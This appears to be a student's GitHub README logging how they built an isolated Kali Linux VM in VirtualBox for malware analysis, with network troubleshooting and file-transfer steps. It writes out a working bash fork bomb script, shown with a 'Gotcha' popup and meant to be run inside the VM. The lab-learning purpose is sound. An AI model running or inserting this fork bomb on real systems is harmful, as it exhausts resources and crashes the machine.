*DISCLOSURE* This repository is currently in progress. I use it to document my progress. 


# Secure Virtual Envrionment for Malware analysis
## OVERVIEW
I successfully built a secure and isolated Kali Linux VM inside VirtualBox to serve as a safe environment for penetration testing and malware analysis.
This project involved configuring network isolation, enforcing firewall rules, and enabling secure file transfers between the host and VM.
I faced multiple technical challenges and resolved them through troubleshooting, Linux networking, and firewall management.

Ultimately, the final test would be to execute some malware on my virtual machine, and cross my fingers that the setup was done properly

It look me some time to finalize the host only network setup for my virtualbox because I ran into some configuration issues(see troubleshooting steps), but eventually I was able to set it up such as 1) my VM can communicate with my host and I can share a file(so I can share the malware zip), and 2) my VM cannot access the internet. 

Then I needed to find tutorials that demonstrate the execution of a malware on a virtual machine. I did not find many resources online, but I did find a website I can download real malware samples: https://bazaar.abuse.ch/browse/. For this first lab, I decided to go for a fork bomb A.K.A rabbit virus. Fork bombs are a type DOS attack(Denial of Service) Leverages Linux's concept called forking because each function call spawns two additional processes and it does that exponentially. A fork bomb crashes the system by exhausting the its resources. the operating system because overwhelmed with all the processes created by the program and can no longer respond.

To visualize it, we will write the function inside an executable, followed by some drama by having a pop up that says " Gotcha ! you're system will crash now " 


## Step By Step Setup
### 1) Install VirtualBox
#### 1.1) visit https://www.virtualbox.org/ and click on Download , and then choose the right executable based on your operating system. This lab will be done on a windows environment.
#### 1.2) Run the installer. For the purpose of this lab, you can install using the default settings.
### 2) Install Kali Linux distribution
#### 2.1) visit https://www.kali.org/get-kali/#kali-virtual-machines and install the VirtualBox version, because that's the virtualization software that we will use in this lab.
#### 2.2) unzip the package at the location of your choice, but note that location as the kali linux operating systemp will be added to your VirtualBox
### 3) Ensure your Kali Linux download is the correct file by comparing the hash of your vdi file with the hash provided on the website
#### 3.2) open Powershell on your windows and write the following command: Get-FileHash "[path to your vdi file].vdi" -Algorithm SHA256. The terminal will output a long hash value. this value should be compared to the checksum value on your Kali linux --> see image below:
![image](https://github.com/user-attachments/assets/e387ffb6-f5cc-4220-8e3c-9fb6132bef03)
#### 3.3) Follow the Kali Linux documentation to add the operating system https://www.kali.org/docs/virtualization/import-premade-virtualbox/
### 4) Setup the host only network 
### 5) verify that your vm is setup properly.

## Running the Fork Bomb
### 1) Create a new file on Linux and write the following code:
https://github.com/yasserhous/Kali-VM/blob/e95a94cdb92b2bf38a6feedf5892a2b35c9eb456/forkbomb.sh#L1C1-L10C14


## Troubling Shooting
1)Ensuring VM can reach Host, and host can reach VM
error: From 192.168.56.101 icmp_seq=3 Destination Host Unreachable
  1) check your network adapter and ensure that the one you want to use is enabled: Control Panel\All Control Panel Items\Network Connections
  2) ![image](https://github.com/user-attachments/assets/81c83f81-efc4-4355-ad9e-6ac3c8c76bc5)
  3)ensure that the VM network adapter chosen is the right one:
  ![image](https://github.com/user-attachments/assets/e5b4609a-113d-4e94-9b9a-7380da1121fe)
  4)run command ip a on your VM terminal and make sure your eth0 on the VM  shows :
  ![image](https://github.com/user-attachments/assets/9baf824d-05ff-4853-8dce-2277b52ec4ed)
  5)go to tools --> Host-Only Networks and ensure that the IP assigned to your adapter is the same as the one to your host:
  ![image](https://github.com/user-attachments/assets/941e3480-14ef-4d9e-bc00-f3af70801006)

2)Changing the double click behavior on Linux.
  1) It took me maybe a few hours to figure that one out since when I was double-clicking, the file was opening with vim. I ended up changing the default application used by going to open-with --> dbus-launch. This forced the OS to launch a new D-bus session which allows the execution of the script.

### 6) write the shell script for the fork bomb
1)create a new file on linux and write down the following script:
<code>
# Show a warning message using notify-send
notify-send "Gotcha ! Your system will stop responding soon."
# Introduce a short delay
sleep 3
# Start the Fork Bomb
:(){ :|:& };:
</code>
2) save the file
3)make the file executabe


## Lessons Learned



Creating a safe hacking environment
You would want to make sure you create a safe environment to since we will be working with real vulnerabilities. This project can go smoother with some basic knowledge of virtual machines and kali-linux. I highly recommend watching Network Chuck content.

Update:
Right now I am running into issues with creating a host only network on virtual box
step 1:
Download & Install virtual box:
https://www.virtualbox.org/
step 2:
Download & Install Kali Linux

Alright I just want to write a bunch of stuff on the journey around installing my first secure VM. I decided to install host only since for now, I did not need to access the internet. I thought it will be a straight forward process by following a tutorial, but I faced a few challenges:
-VM UI not showing multiple adapters in the network section:
![image](https://github.com/user-attachments/assets/f5f915e0-7669-45df-81d6-44e39c880110)
-When trying to figure out how to add it, one solution was to go to file --> Host Network Manager. But when I went to file, here is what I found:
![image](https://github.com/user-attachments/assets/cdd55b35-0d7d-40e7-be5a-e7c3e0f0df56)
As you notice, no Host Network Manager

At that moment, I realized my issue might very well be the virtualbox installation. I removed virtual box completely, and reinstalled it, and then I was finally able to see the network options. I still could bot find the  file --> Host Network Manager, but I found the Tools --> Properties options which contained everything I needed

Commands used:
To host files from host to VM
1) locate folder where the files you want to share are stored
2) open command prompt and run python -m http.server 8080 ( you need to have python installed)
3) on the VM open terminal and run: wget http://192.168.56.1:8080/yourfile.txt


sources:
Network Chuck how to build a HACKING lab : https://www.youtube.com/watch?v=mvsiuLzpx2E 
Fork Bomb: https://www.youtube.com/watch?v=RhtjGp7oMvE
